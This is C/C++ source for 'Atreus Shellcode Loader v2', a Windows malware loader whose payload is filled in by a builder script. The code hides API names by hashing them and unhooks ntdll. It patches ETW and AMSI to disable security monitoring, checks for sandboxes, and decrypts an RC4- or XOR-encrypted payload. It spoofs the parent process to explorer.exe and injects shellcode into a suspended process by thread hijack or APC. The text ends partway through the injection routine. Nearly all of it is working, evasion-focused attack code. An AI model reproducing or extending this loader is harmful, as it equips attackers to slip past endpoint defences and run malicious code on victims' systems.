// Atreus Shellcode Loader v2
// Feature flags (via -D):
//   USE_RC4           : RC4 decryption (default: XOR if USE_XOR)
//   USE_XOR           : XOR decryption
//   USE_PPID_SPOOF    : Spoof PPID to explorer.exe
//   USE_THREAD_HIJACK : RIP redirect instead of Early Bird APC
//   USE_AMSI_PATCH    : Patch AmsiScanBuffer
//   USE_SANDBOX_CHECK : Basic sandbox/timing detection
//   USE_WIPE          : Zero heap payload after injection
//   USE_ETW_PATCH     : Patch EtwEventWrite before injection
//   USE_UNHOOK        : Remap ntdll .text from disk before injection
//   ATREUS_DEBUG      : MessageBox at each step (requires -luser32)

#define WIN32_LEAN_AND_MEAN
#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0601
#endif
#include <windows.h>
#include <winternl.h>
#include <intrin.h>
#include <string.h>

// ─── Debug helper (ATREUS_DEBUG only) ────────────────────────────────────────

#ifdef ATREUS_DEBUG
static HANDLE _dbg_fh = INVALID_HANDLE_VALUE;
static char   _dbg_buf[512];

static void _dbg_open() {
    if (_dbg_fh != INVALID_HANDLE_VALUE) return;
    _dbg_fh = GetStdHandle(STD_OUTPUT_HANDLE);
    if (_dbg_fh == INVALID_HANDLE_VALUE || _dbg_fh == NULL) {
        AttachConsole(ATTACH_PARENT_PROCESS);
        _dbg_fh = CreateFileA("CONOUT$", GENERIC_WRITE, FILE_SHARE_WRITE,
            NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    }
}
static DWORD _dbg_strlen(const char *s) { DWORD n=0; while(s[n]) n++; return n; }
static void _dbg_write(const char *msg) {
    _dbg_open();
    if (!_dbg_fh || _dbg_fh == INVALID_HANDLE_VALUE) return;
    DWORD w; WriteFile(_dbg_fh, msg, _dbg_strlen(msg), &w, NULL);
    WriteFile(_dbg_fh, "\r\n", 2, &w, NULL);
}
static void _dbg_append(char *dst, const char *src, int max) {
    int i=0; while(dst[i]) i++;
    int j=0; while(src[j] && i<max-1) dst[i++]=src[j++]; dst[i]='\0';
}
static void _dbg_ulltoa(unsigned long long v, char *s) {
    if (!v) { s[0]='0'; s[1]='\0'; return; }
    char tmp[24]; int i=0;
    while (v) { tmp[i++]=(char)('0'+(v%10)); v/=10; }
    int j=0; while(i>0) s[j++]=tmp[--i]; s[j]='\0';
}
static void _dbg_hexstr(unsigned long long val, char *out) {
    static const char h[]="0123456789ABCDEF";
    out[0]='0'; out[1]='x'; int i=2;
    for(int s=60; s>=0; s-=4) { unsigned char n=(unsigned char)((val>>s)&0xF); if(n||i>2) out[i++]=h[n]; }
    if(i==2) out[i++]='0';
    out[i]='\0';
}
static void dbg(const char *msg) { _dbg_write(msg); }
static void dbg_val(const char *msg, unsigned long long val) {
    char num[24]; _dbg_ulltoa(val, num);
    _dbg_buf[0]='\0'; _dbg_append(_dbg_buf, msg, 480);
    _dbg_append(_dbg_buf, ": ", 480); _dbg_append(_dbg_buf, num, 480);
    _dbg_write(_dbg_buf);
}
static void dbg_hex(const char *msg, unsigned long long val) {
    char num[20]; _dbg_hexstr(val, num);
    _dbg_buf[0]='\0'; _dbg_append(_dbg_buf, msg, 480);
    _dbg_append(_dbg_buf, ": ", 480); _dbg_append(_dbg_buf, num, 480);
    _dbg_write(_dbg_buf);
}
#define DBG(msg)       dbg(msg)
#define DBG_VAL(m,v)   dbg_val(m,(unsigned long long)(v))
#define DBG_HEX(m,v)   dbg_hex(m,(unsigned long long)(v))

// Console entry point for debug builds (replaces GUI WinMain)
int main() { return WinMain(NULL, NULL, NULL, 0); }

#else
#define DBG(msg)       ((void)0)
#define DBG_VAL(m,v)   ((void)0)
#define DBG_HEX(m,v)   ((void)0)
#endif

// ─── Compile-time hash (no API name strings in binary) ──────────────────────

static constexpr DWORD _hA(const char *s, DWORD h = 5381) {
    return *s ? _hA(s + 1, h * 33 ^ (DWORD)(unsigned char)*s) : h;
}
static constexpr DWORD _hW(const wchar_t *s, DWORD h = 5381) {
    return *s ? _hW(s + 1, h * 33 ^ (DWORD)((*s >= L'A' && *s <= L'Z') ? *s + 32 : *s)) : h;
}

constexpr DWORD HMOD_KERNEL32   = _hW(L"kernel32.dll");
constexpr DWORD HMOD_KERNELBASE = _hW(L"kernelbase.dll");
constexpr DWORD HMOD_NTDLL      = _hW(L"ntdll.dll");
#ifdef USE_AMSI_PATCH
constexpr DWORD HMOD_AMSI     = _hW(L"amsi.dll");
#endif

constexpr DWORD HF_CreateFileA              = _hA("CreateFileA");
constexpr DWORD HF_CreateFileMappingA       = _hA("CreateFileMappingA");
constexpr DWORD HF_MapViewOfFile            = _hA("MapViewOfFile");
constexpr DWORD HF_UnmapViewOfFile          = _hA("UnmapViewOfFile");
constexpr DWORD HF_CloseHandle              = _hA("CloseHandle");
constexpr DWORD HF_VirtualProtect           = _hA("VirtualProtect");
constexpr DWORD HF_CreateProcessW           = _hA("CreateProcessW");
constexpr DWORD HF_ResumeThread             = _hA("ResumeThread");
constexpr DWORD HF_LoadLibraryA             = _hA("LoadLibraryA");
#ifdef USE_PPID_SPOOF
constexpr DWORD HF_CreateToolhelp32Snapshot = _hA("CreateToolhelp32Snapshot");
constexpr DWORD HF_Process32FirstW          = _hA("Process32FirstW");
constexpr DWORD HF_Process32NextW           = _hA("Process32NextW");
constexpr DWORD HF_OpenProcess              = _hA("OpenProcess");
constexpr DWORD HF_InitProcThreadAttrList   = _hA("InitializeProcThreadAttributeList");
constexpr DWORD HF_UpdateProcThreadAttr     = _hA("UpdateProcThreadAttribute");
constexpr DWORD HF_DeleteProcThreadAttrList = _hA("DeleteProcThreadAttributeList");
#endif
#ifdef USE_SANDBOX_CHECK
constexpr DWORD HF_GetTickCount64           = _hA("GetTickCount64");
constexpr DWORD HF_Sleep                    = _hA("Sleep");
constexpr DWORD HF_GlobalMemoryStatusEx     = _hA("GlobalMemoryStatusEx");
constexpr DWORD HF_GetSystemInfo            = _hA("GetSystemInfo");
#endif

constexpr DWORD HF_NtAllocateVirtualMemory  = _hA("NtAllocateVirtualMemory");
constexpr DWORD HF_NtFreeVirtualMemory      = _hA("NtFreeVirtualMemory");
constexpr DWORD HF_NtWriteVirtualMemory     = _hA("NtWriteVirtualMemory");
constexpr DWORD HF_NtProtectVirtualMemory   = _hA("NtProtectVirtualMemory");
constexpr DWORD HF_NtQueueApcThread         = _hA("NtQueueApcThread");
constexpr DWORD HF_NtResumeThread           = _hA("NtResumeThread");
constexpr DWORD HF_EtwEventWrite            = _hA("EtwEventWrite");
#ifdef USE_THREAD_HIJACK
constexpr DWORD HF_NtGetContextThread       = _hA("NtGetContextThread");
constexpr DWORD HF_NtSetContextThread       = _hA("NtSetContextThread");
#endif
#ifdef USE_AMSI_PATCH
constexpr DWORD HF_AmsiScanBuffer           = _hA("AmsiScanBuffer");
#endif

// ─── PEB walk: find module by hash ──────────────────────────────────────────

typedef struct _MY_LDR_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitOrderLinks;
    PVOID      DllBase;
    PVOID      EntryPoint;
    ULONG      SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} MY_LDR_ENTRY;

static HMODULE peb_module(DWORD hash) {
#ifdef _WIN64
    PEB *peb = (PEB *)__readgsqword(0x60);
#else
    PEB *peb = (PEB *)__readfsdword(0x30);
#endif
    LIST_ENTRY *head = &peb->Ldr->InMemoryOrderModuleList;
    for (LIST_ENTRY *e = head->Flink; e != head; e = e->Flink) {
        MY_LDR_ENTRY *m = CONTAINING_RECORD(e, MY_LDR_ENTRY, InMemoryOrderLinks);
        if (!m->BaseDllName.Buffer) continue;
        DWORD h = 5381;
        for (WCHAR *p = m->BaseDllName.Buffer; *p; p++) {
            WCHAR c = (*p >= L'A' && *p <= L'Z') ? *p + 32 : *p;
            h = h * 33 ^ (DWORD)c;
        }
        if (h == hash) return (HMODULE)m->DllBase;
    }
    return NULL;
}

// ─── Export table walk: resolve function by hash (handles forwarded exports) ─

static DWORD _hash_name_ascii(const char *s) {
    DWORD h = 5381;
    while (*s) h = h * 33 ^ (DWORD)(unsigned char)*s++;
    return h;
}
static DWORD _hash_dll_name(const char *s) {
    /* Same as _hW but from ASCII, lowercase A-Z -> a-z */
    DWORD h = 5381;
    for (; *s; s++) {
        unsigned char c = (unsigned char)*s;
        if (c >= 'A' && c <= 'Z') c += 32;
        h = h * 33 ^ (DWORD)c;
    }
    return h;
}

static FARPROC resolve(HMODULE hMod, DWORD hash, int depth = 0) {
    if (!hMod || depth > 4) return NULL;
    BYTE *base = (BYTE *)hMod;
    IMAGE_DOS_HEADER *dos  = (IMAGE_DOS_HEADER *)base;
    IMAGE_NT_HEADERS *nt   = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
    DWORD exp_rva  = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    DWORD exp_size = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
    if (!exp_rva) return NULL;
    IMAGE_EXPORT_DIRECTORY *exp = (IMAGE_EXPORT_DIRECTORY *)(base + exp_rva);
    DWORD *names    = (DWORD *)(base + exp->AddressOfNames);
    WORD  *ordinals = (WORD  *)(base + exp->AddressOfNameOrdinals);
    DWORD *funcs    = (DWORD *)(base + exp->AddressOfFunctions);
    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        const char *name = (const char *)(base + names[i]);
        DWORD h = 5381;
        const char *p = name;
        while (*p) h = h * 33 ^ (DWORD)(unsigned char)*p++;
        if (h != hash) continue;
        DWORD fn_rva = funcs[ordinals[i]];
        /* Forwarded export: RVA falls inside the export directory region */
        if (fn_rva >= exp_rva && fn_rva < exp_rva + exp_size) {
            /* String format: "DLLNAME.FuncName" (DLLNAME has no .dll suffix) */
            const char *fwd = (const char *)(base + fn_rva);
            char dll_buf[72]; int di = 0;
            p = fwd;
            while (*p && *p != '.' && di < 63) dll_buf[di++] = *p++;
            dll_buf[di++]='.'; dll_buf[di++]='d'; dll_buf[di++]='l'; dll_buf[di++]='l'; dll_buf[di]='\0';
            if (*p == '.') p++;
            DWORD fn_hash  = _hash_name_ascii(p);
            DWORD dll_hash = _hash_dll_name(dll_buf);
            HMODULE hFwd   = peb_module(dll_hash);
            if (hFwd) return resolve(hFwd, fn_hash, depth + 1);
            return NULL;
        }
        return (FARPROC)(base + fn_rva);
    }
    return NULL;
}

#define R(mod, fn)   resolve(peb_module(mod), fn)
/* Try kernel32 first, fall back to KernelBase (API-set forwarding) */
#define RK32(fn)     ([&]() -> FARPROC { \
    FARPROC _p = resolve(peb_module(HMOD_KERNEL32),   fn); \
    if (!_p)  _p = resolve(peb_module(HMOD_KERNELBASE), fn); \
    return _p; }())

// ─── ntdll unhook: remap .text from clean disk copy ─────────────────────────

#ifdef USE_UNHOOK
static void unhook_ntdll() {
    HMODULE hK32   = peb_module(HMOD_KERNEL32);
    HMODULE hNtdll = peb_module(HMOD_NTDLL);
    if (!hK32 || !hNtdll) return;

    typedef HANDLE (WINAPI *t_CFA)(LPCSTR,DWORD,DWORD,LPSECURITY_ATTRIBUTES,DWORD,DWORD,HANDLE);
    typedef HANDLE (WINAPI *t_CFMA)(HANDLE,LPSECURITY_ATTRIBUTES,DWORD,DWORD,DWORD,LPCSTR);
    typedef LPVOID (WINAPI *t_MVF)(HANDLE,DWORD,DWORD,DWORD,SIZE_T);
    typedef BOOL   (WINAPI *t_UMVF)(LPCVOID);
    typedef BOOL   (WINAPI *t_CH)(HANDLE);
    typedef BOOL   (WINAPI *t_VP)(LPVOID,SIZE_T,DWORD,PDWORD);

    t_CFA  pCFA  = (t_CFA) R(HMOD_KERNEL32, HF_CreateFileA);
    t_CFMA pCFMA = (t_CFMA)R(HMOD_KERNEL32, HF_CreateFileMappingA);
    t_MVF  pMVF  = (t_MVF) R(HMOD_KERNEL32, HF_MapViewOfFile);
    t_UMVF pUMVF = (t_UMVF)R(HMOD_KERNEL32, HF_UnmapViewOfFile);
    t_CH   pCH   = (t_CH)  R(HMOD_KERNEL32, HF_CloseHandle);
    t_VP   pVP   = (t_VP)  R(HMOD_KERNEL32, HF_VirtualProtect);
    if (!pCFA || !pCFMA || !pMVF || !pUMVF || !pCH || !pVP) return;

    /* Build path on stack to avoid static string */
    char path[48];
    const char s[] = { 'C',':','\\','W','i','n','d','o','w','s','\\',
                        'S','y','s','t','e','m','3','2','\\',
                        'n','t','d','l','l','.','d','l','l','\0' };
    memcpy(path, s, sizeof(s));

    HANDLE hFile = pCFA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;
    HANDLE hMap = pCFMA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!hMap) { pCH(hFile); return; }
    LPVOID pClean = pMVF(hMap, FILE_MAP_READ, 0, 0, 0);
    if (!pClean) { pCH(hMap); pCH(hFile); return; }

    BYTE *base = (BYTE *)hNtdll;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(base + ((IMAGE_DOS_HEADER *)base)->e_lfanew);
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (memcmp(sec->Name, ".text", 5) == 0) {
            DWORD old;
            LPVOID addr = base + sec->VirtualAddress;
            SIZE_T sz   = sec->Misc.VirtualSize;
            if (pVP(addr, sz, PAGE_EXECUTE_READWRITE, &old)) {
                memcpy(addr, (BYTE *)pClean + sec->VirtualAddress, sz);
                pVP(addr, sz, old, &old);
            }
            break;
        }
    }
    pUMVF(pClean); pCH(hMap); pCH(hFile);
}
#endif /* USE_UNHOOK */

// ─── Payload (stamped by builder.py) ────────────────────────────────────────

static unsigned char payload[] = { %PAYLOAD% };
static const size_t  payload_size = sizeof(payload);

// ─── RC4 ─────────────────────────────────────────────────────────────────────

#ifdef USE_RC4
static void rc4_crypt(const unsigned char *key, size_t klen,
                      unsigned char *data, size_t dlen) {
    unsigned char S[256];
    for (int i = 0; i < 256; i++) S[i] = (unsigned char)i;
    int j = 0;
    for (int i = 0; i < 256; i++) {
        j = (j + S[i] + key[i % klen]) & 0xFF;
        unsigned char t = S[i]; S[i] = S[j]; S[j] = t;
    }
    int x = 0; j = 0;
    for (size_t i = 0; i < dlen; i++) {
        x = (x + 1) & 0xFF;
        j = (j + S[x]) & 0xFF;
        unsigned char t = S[x]; S[x] = S[j]; S[j] = t;
        data[i] ^= S[(S[x] + S[j]) & 0xFF];
    }
}
static const unsigned char rc4_key[] = { %RC4_KEY% };
#endif /* USE_RC4 */

// ─── XOR ─────────────────────────────────────────────────────────────────────

#ifdef USE_XOR
static void xor_crypt(unsigned char *buf, size_t len) {
    const unsigned char key[] = { %XOR_KEY_BYTES% };
    const size_t klen = sizeof(key);
    for (size_t i = 0; i < len; i++) buf[i] ^= key[i % klen];
}
#endif

// ─── Sandbox check ───────────────────────────────────────────────────────────

#ifdef USE_SANDBOX_CHECK
static int sandbox_check() {
    HMODULE hK32 = peb_module(HMOD_KERNEL32);

    typedef ULONGLONG (WINAPI *t_GTC64)();
    typedef void      (WINAPI *t_Sleep)(DWORD);
    typedef BOOL      (WINAPI *t_GMSE)(LPMEMORYSTATUSEX);
    typedef void      (WINAPI *t_GSI)(LPSYSTEM_INFO);

    t_GTC64 pGTC64 = (t_GTC64)R(HMOD_KERNEL32, HF_GetTickCount64);
    t_Sleep pSleep = (t_Sleep)R(HMOD_KERNEL32, HF_Sleep);
    t_GMSE  pGMSE  = (t_GMSE) R(HMOD_KERNEL32, HF_GlobalMemoryStatusEx);
    t_GSI   pGSI   = (t_GSI)  R(HMOD_KERNEL32, HF_GetSystemInfo);

    /* Uptime > 5 minutes */
    if (pGTC64 && pGTC64() < 300000ULL) return 0;

    /* RAM > 2 GB */
    if (pGMSE) {
        MEMORYSTATUSEX ms; ms.dwLength = sizeof(ms);
        if (pGMSE(&ms) && ms.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) return 0;
    }

    /* >= 2 logical CPUs */
    if (pGSI) {
        SYSTEM_INFO si; pGSI(&si);
        if (si.dwNumberOfProcessors < 2) return 0;
    }

    /* Sleep skipping check: sleep 500ms, verify at least 400ms elapsed */
    if (pSleep && pGTC64) {
        ULONGLONG t0 = pGTC64();
        pSleep(500);
        if (pGTC64() - t0 < 400) return 0;
    }

    return 1;
}
#endif /* USE_SANDBOX_CHECK */

// ─── PPID spoof: find explorer.exe PID ───────────────────────────────────────

#ifdef USE_PPID_SPOOF
#include <tlhelp32.h>
static DWORD get_explorer_pid() {
    typedef HANDLE (WINAPI *t_CTS)(DWORD, DWORD);
    typedef BOOL   (WINAPI *t_P32FW)(HANDLE, LPPROCESSENTRY32W);
    typedef BOOL   (WINAPI *t_P32NW)(HANDLE, LPPROCESSENTRY32W);
    typedef BOOL   (WINAPI *t_CH)(HANDLE);

    t_CTS  pCTS  = (t_CTS) R(HMOD_KERNEL32, HF_CreateToolhelp32Snapshot);
    t_P32FW pPFF = (t_P32FW)R(HMOD_KERNEL32, HF_Process32FirstW);
    t_P32NW pPFN = (t_P32NW)R(HMOD_KERNEL32, HF_Process32NextW);
    t_CH    pCH  = (t_CH)  R(HMOD_KERNEL32, HF_CloseHandle);
    if (!pCTS || !pPFF || !pPFN || !pCH) return 0;

    HANDLE snap = pCTS(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe; pe.dwSize = sizeof(pe);
    DWORD pid = 0;
    if (pPFF(snap, &pe)) do {
        if (_wcsicmp(pe.szExeFile, L"explorer.exe") == 0) { pid = pe.th32ProcessID; break; }
    } while (pPFN(snap, &pe));
    pCH(snap);
    return pid;
}
#endif /* USE_PPID_SPOOF */

// ─── WinMain ─────────────────────────────────────────────────────────────────

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {

    DBG("[1] Atreus started");

#ifdef USE_SANDBOX_CHECK
    if (!sandbox_check()) { DBG("[FAIL] Sandbox check failed - exiting"); return 0; }
    DBG("[1] Sandbox check passed");
#endif

#ifdef USE_UNHOOK
    unhook_ntdll();
    DBG("[2] ntdll unhooked");
#endif

    /* ETW patch: xor eax,eax; ret */
#ifdef USE_ETW_PATCH
    {
        FARPROC pEtw = R(HMOD_NTDLL, HF_EtwEventWrite);
        if (pEtw) {
            typedef BOOL (WINAPI *t_VP)(LPVOID, SIZE_T, DWORD, PDWORD);
            t_VP pVP = (t_VP)R(HMOD_KERNEL32, HF_VirtualProtect);
            if (pVP) {
                static const BYTE patch[] = { 0x33, 0xC0, 0xC3 };
                DWORD old;
                if (pVP((LPVOID)pEtw, sizeof(patch), PAGE_EXECUTE_READWRITE, &old)) {
                    memcpy((void *)pEtw, patch, sizeof(patch));
                    pVP((LPVOID)pEtw, sizeof(patch), old, &old);
                    DBG("[3] ETW patched");
                } else { DBG("[WARN] ETW VirtualProtect failed"); }
            }
        } else { DBG("[WARN] EtwEventWrite not found"); }
    }
#endif /* USE_ETW_PATCH */

    /* AMSI patch: xor eax,eax; ret */
#ifdef USE_AMSI_PATCH
    {
        typedef HMODULE (WINAPI *t_LLA)(LPCSTR);
        t_LLA pLLA = (t_LLA)R(HMOD_KERNEL32, HF_LoadLibraryA);
        if (pLLA) {
            const char amsi_dll[] = {'a','m','s','i','.','d','l','l','\0'};
            HMODULE hAmsi = (HMODULE)peb_module(HMOD_AMSI);
            if (!hAmsi) hAmsi = pLLA(amsi_dll);
            if (hAmsi) {
                FARPROC pASB = resolve(hAmsi, HF_AmsiScanBuffer);
                if (pASB) {
                    typedef BOOL (WINAPI *t_VP)(LPVOID, SIZE_T, DWORD, PDWORD);
                    t_VP pVP = (t_VP)R(HMOD_KERNEL32, HF_VirtualProtect);
                    if (pVP) {
                        static const BYTE patch[] = { 0x33, 0xC0, 0xC3 };
                        DWORD old;
                        if (pVP((LPVOID)pASB, sizeof(patch), PAGE_EXECUTE_READWRITE, &old)) {
                            memcpy((void *)pASB, patch, sizeof(patch));
                            pVP((LPVOID)pASB, sizeof(patch), old, &old);
                            DBG("[4] AMSI patched");
                        } else { DBG("[WARN] AMSI VirtualProtect failed"); }
                    }
                } else { DBG("[WARN] AmsiScanBuffer not found"); }
            } else { DBG("[WARN] amsi.dll not loaded"); }
        }
    }
#endif /* USE_AMSI_PATCH */

    /* Resolve all Nt* from ntdll (no forwarded exports, actual syscall stubs) */
    typedef NTSTATUS (NTAPI *t_NtAVM)(HANDLE,PVOID*,ULONG_PTR,PSIZE_T,ULONG,ULONG);
    typedef NTSTATUS (NTAPI *t_NtFVM)(HANDLE,PVOID*,PSIZE_T,ULONG);
    typedef NTSTATUS (NTAPI *t_NtWVM)(HANDLE,PVOID,PVOID,SIZE_T,PSIZE_T);
    typedef NTSTATUS (NTAPI *t_NtPVM)(HANDLE,PVOID*,PSIZE_T,ULONG,PULONG);
    typedef NTSTATUS (NTAPI *t_NtQAT)(HANDLE,PVOID,PVOID,PVOID,PVOID);
    typedef NTSTATUS (NTAPI *t_NtRT) (HANDLE,PULONG);

    HMODULE hNtdll = peb_module(HMOD_NTDLL);
    t_NtAVM pNtAVM = (t_NtAVM)resolve(hNtdll, HF_NtAllocateVirtualMemory);
    t_NtFVM pNtFVM = (t_NtFVM)resolve(hNtdll, HF_NtFreeVirtualMemory);
    t_NtWVM pNtWVM = (t_NtWVM)resolve(hNtdll, HF_NtWriteVirtualMemory);
    t_NtPVM pNtPVM = (t_NtPVM)resolve(hNtdll, HF_NtProtectVirtualMemory);
    t_NtRT  pNtRT  = (t_NtRT) resolve(hNtdll, HF_NtResumeThread);

    if (!pNtAVM || !pNtFVM || !pNtWVM || !pNtPVM || !pNtRT) {
        DBG("[FAIL] Nt* API resolution failed"); return 1;
    }

    /* Allocate local RW page for decrypted shellcode (NtAllocateVirtualMemory on self) */
    unsigned char *sc = NULL;
    SIZE_T sc_sz = payload_size;
    NTSTATUS stLocal = pNtAVM((HANDLE)-1, (PVOID*)&sc, 0, &sc_sz,
                               MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!sc) { DBG("[FAIL] local alloc failed"); return 1; }

    memcpy(sc, payload, payload_size);
    memset(payload, 0, payload_size);
    DBG_VAL("[5] Payload copied, size", (unsigned long long)payload_size);

    /* Decrypt */
#ifdef USE_RC4
    rc4_crypt(rc4_key, sizeof(rc4_key), sc, payload_size);
    DBG("[6] RC4 decryption done");
#elif defined(USE_XOR)
    xor_crypt(sc, payload_size);
    DBG("[6] XOR decryption done");
#else
    DBG("[6] No decryption (plaintext)");
#endif

    /* Spawn target process suspended */
    PROCESS_INFORMATION pi = {0};
    wchar_t target[] = { %TARGET_PROCESS_W% };

#ifdef USE_PPID_SPOOF
    STARTUPINFOEXW siex = {0};
    siex.StartupInfo.cb = sizeof(siex);

    typedef BOOL (WINAPI *t_IPAL)(LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD, PSIZE_T);
    typedef BOOL (WINAPI *t_UPTA)(LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD_PTR, PVOID, SIZE_T, PVOID, PSIZE_T);
    typedef void (WINAPI *t_DPAL)(LPPROC_THREAD_ATTRIBUTE_LIST);
    typedef HANDLE (WINAPI *t_OP)(DWORD, BOOL, DWORD);
    typedef BOOL   (WINAPI *t_CH)(HANDLE);
    typedef BOOL   (WINAPI *t_CPW)(LPCWSTR,LPWSTR,LPSECURITY_ATTRIBUTES,LPSECURITY_ATTRIBUTES,BOOL,DWORD,LPVOID,LPCWSTR,LPSTARTUPINFOW,LPPROCESS_INFORMATION);

    t_IPAL pIPAL = (t_IPAL)RK32(HF_InitProcThreadAttrList);
    t_UPTA pUPTA = (t_UPTA)RK32(HF_UpdateProcThreadAttr);
    t_DPAL pDPAL = (t_DPAL)RK32(HF_DeleteProcThreadAttrList);
    t_OP   pOP   = (t_OP)  R(HMOD_KERNEL32, HF_OpenProcess);
    t_CH   pCH   = (t_CH)  R(HMOD_KERNEL32, HF_CloseHandle);
    t_CPW  pCPW  = (t_CPW) R(HMOD_KERNEL32, HF_CreateProcessW);

    /* Stack-allocated PAL - avoids Heap* forwarded exports */
    char pal_buf[1024] = {0};
    LPPROC_THREAD_ATTRIBUTE_LIST pal = NULL;
    SIZE_T pal_sz = 0;
    if (pIPAL) {
        pIPAL(NULL, 1, 0, &pal_sz);
        DBG_VAL("[7a] PAL size needed", (unsigned long long)pal_sz);
        if (pal_sz && pal_sz <= sizeof(pal_buf)) {
            pal = (LPPROC_THREAD_ATTRIBUTE_LIST)pal_buf;
            if (!pIPAL(pal, 1, 0, &pal_sz)) { DBG("[WARN] IPAL second call failed"); pal = NULL; }
        } else { DBG_VAL("[WARN] PAL buf too small or pal_sz=0", (unsigned long long)pal_sz); }
    } else { DBG("[WARN] pIPAL is NULL"); }
    HANDLE hParent = NULL;

    if (pal) {
        DWORD epid = get_explorer_pid();
        DBG_VAL("[7] Explorer PID", epid);
        if (epid && pOP) hParent = pOP(PROCESS_CREATE_PROCESS, FALSE, epid);
        if (hParent) {
            DBG("[7] OpenProcess(explorer) OK");
            if (pUPTA)
                pUPTA(pal, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL);
        } else { DBG("[WARN] OpenProcess(explorer) failed - no PPID spoof"); }
        siex.lpAttributeList = pal;
    } else { DBG("[WARN] InitializeProcThreadAttributeList failed"); }

    if (pCPW) pCPW(target, NULL, NULL, NULL, FALSE,
        CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT,
        NULL, NULL, (LPSTARTUPINFOW)&siex, &pi);
    DBG_VAL("[8] CreateProcess (PPID spoof) pid", pi.dwProcessId);

    if (pal && pDPAL) pDPAL(pal);
    if (hParent && pCH) pCH(hParent);
#else
    {
        typedef BOOL (WINAPI *t_CPW)(LPCWSTR,LPWSTR,LPSECURITY_ATTRIBUTES,LPSECURITY_ATTRIBUTES,BOOL,DWORD,LPVOID,LPCWSTR,LPSTARTUPINFOW,LPPROCESS_INFORMATION);
        t_CPW pCPW = (t_CPW)R(HMOD_KERNEL32, HF_CreateProcessW);
        STARTUPINFOW si = {0}; si.cb = sizeof(si);
        if (pCPW) pCPW(target, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED,
                        NULL, NULL, &si, &pi);
        DBG_VAL("[7] CreateProcess pid", pi.dwProcessId);
    }
#endif /* USE_PPID_SPOOF */

    if (!pi.hProcess) {
        DBG("[FAIL] CreateProcess failed (hProcess=NULL)");
        { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }
        return 1;
    }
    DBG("[8] Target process created suspended");

    if (!pNtWVM || !pNtPVM || !pNtRT) {
        DBG("[FAIL] Nt write/protect/resume APIs missing");
        { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }
        typedef BOOL (WINAPI *t_CH2)(HANDLE);
        t_CH2 pCH2 = (t_CH2)R(HMOD_KERNEL32, HF_CloseHandle);
        if (pCH2) { pCH2(pi.hThread); pCH2(pi.hProcess); }
        return 1;
    }

    /* Alloc RW in target process */
    PVOID  remote = NULL;
    SIZE_T alloc_sz = payload_size;
    NTSTATUS st = pNtAVM(pi.hProcess, &remote, 0, &alloc_sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remote) {
        DBG_HEX("[FAIL] NtAllocateVirtualMemory (remote) NTSTATUS", (unsigned long long)(ULONG)st);
        { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }
        typedef BOOL (WINAPI *t_CH2)(HANDLE);
        t_CH2 pCH2 = (t_CH2)R(HMOD_KERNEL32, HF_CloseHandle);
        if (pCH2) { pCH2(pi.hThread); pCH2(pi.hProcess); }
        return 1;
    }
    DBG_HEX("[10] remote alloc addr", (unsigned long long)(ULONG_PTR)remote);

    /* Write shellcode */
    st = pNtWVM(pi.hProcess, remote, sc, payload_size, NULL);

#ifdef USE_WIPE
    memset(sc, 0, payload_size);
#endif
    { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }

    /* RW -> RX */
    PVOID  prot_base = remote;
    SIZE_T prot_sz   = payload_size;
    ULONG  old_prot  = 0;
    st = pNtPVM(pi.hProcess, &prot_base, &prot_sz, PAGE_EXECUTE_READ, &old_prot);

#ifdef USE_THREAD_HIJACK
    {
        typedef NTSTATUS (NTAPI *t_NtGCT)(HANDLE, PCONTEXT);
        typedef NTSTATUS (NTAPI *t_NtSCT)(HANDLE, PCONTEXT);
        t_NtGCT pGCT = (t_NtGCT)resolve(hNtdll, HF_NtGetContextThread);
        t_NtSCT pSCT = (t_NtSCT)resolve(hNtdll, HF_NtSetContextThread);
        if (pGCT && pSCT) {
            CONTEXT ctx = {0};
            ctx.ContextFlags = CONTEXT_FULL;
            pGCT(pi.hThread, &ctx);
#ifdef _WIN64
            ctx.Rip = (DWORD64)remote;
            DBG_HEX("[13] Thread hijack RIP", (unsigned long long)ctx.Rip);
#else
            ctx.Eip = (DWORD)remote;
            DBG_HEX("[13] Thread hijack EIP", (unsigned long long)ctx.Eip);
#endif
            pSCT(pi.hThread, &ctx);
        } else { DBG("[FAIL] NtGet/SetContextThread not found"); }
    }
#else
    {
        typedef NTSTATUS (NTAPI *t_NtQAT)(HANDLE,PVOID,PVOID,PVOID,PVOID);
        t_NtQAT pNtQAT = (t_NtQAT)resolve(hNtdll, HF_NtQueueApcThread);
